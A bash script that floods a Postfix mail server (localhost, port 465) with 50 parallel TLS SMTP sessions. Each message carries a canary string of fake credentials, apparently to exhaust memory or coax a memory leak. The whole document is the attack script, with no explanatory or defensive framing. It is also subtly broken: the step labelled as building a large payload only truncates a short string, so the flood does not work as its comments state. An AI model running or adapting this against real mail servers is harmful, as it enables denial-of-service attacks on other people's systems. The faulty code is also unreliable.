#!/bin/bash

# Target Postfix
TARGET="localhost"
PORT="465"
PAYLOAD="shay@shay.local:mailpassword:user@user.local:LeakThis: Secret42:"

echo "Starting Postfix memory flood on port $PORT..."

BIG_PAYLOAD=$(printf "%s" "$PAYLOAD" | head -c 700000)

# Flood Postfix with mail requests
for i in {1..50}; do
  (
    echo -e "EHLO shay.local\r\nMAIL FROM: shay@shay.local\r\nRCPT TO: user@user.local\r\nDATA\r\nSubject: LeakThis\r\n${BIG_PAYLOAD}\r\n.\r\nQUIT\r\n" | \
    openssl s_client -connect "$TARGET:$PORT" -tls1_2 -cipher AES256-SHA -quiet 2>/dev/null
  ) &
  echo "Sent SMTP payload $i/50"
  sleep 0.1
done

# Keep it running to hold memory
echo "Flood complete. Keeping payloads in memory for 5 minutes..."
sleep 300

echo "Script done."